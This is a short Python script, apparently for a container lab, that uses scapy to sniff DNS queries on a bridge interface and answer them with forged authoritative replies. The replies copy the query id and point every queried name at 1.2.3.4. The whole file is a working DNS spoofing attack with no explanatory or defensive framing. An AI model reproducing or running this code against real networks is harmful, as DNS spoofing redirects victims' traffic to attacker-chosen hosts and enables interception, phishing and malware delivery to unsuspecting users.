from scapy.all import *

net_interface = next((iface for iface in conf.ifaces.values() if iface.name.startswith("br-")), None)


packet_filter = " and ".join([
    "udp dst port 53",          # Filter UDP port 53
    "udp[10] & 0x80 = 0"        # DNS queries only
    #"src host 192.168.86.25"     IP source <ip>
    ])

def dns_reply(packet):

    eth = Ether(
        src=packet[Ether].dst,
        dst=packet[Ether].src
        )

    ip = IP(
        src=packet[IP].dst,
        dst=packet[IP].src
        )
    
    udp = UDP(
        dport=packet[UDP].sport,
        sport=packet[UDP].dport
        )

    dns = DNS(
        id=packet[DNS].id,
        qd=packet[DNS].qd,
        aa=1,
        rd=0,
        qr=1,
        qdcount=1,
        ancount=1,
        nscount=0,
        arcount=0,
        an=DNSRR(
             rrname=packet[DNS].qd.qname,
             type='A',
             ttl=600,
            rdata='1.2.3.4'),
        ar=packet[DNSRROPT])

    response_packet = eth / ip / udp / dns

    print(response_packet.show())
    sendp(response_packet, iface=net_interface)

sniff(filter=packet_filter, prn=dns_reply, store=0, iface=net_interface, count=1)
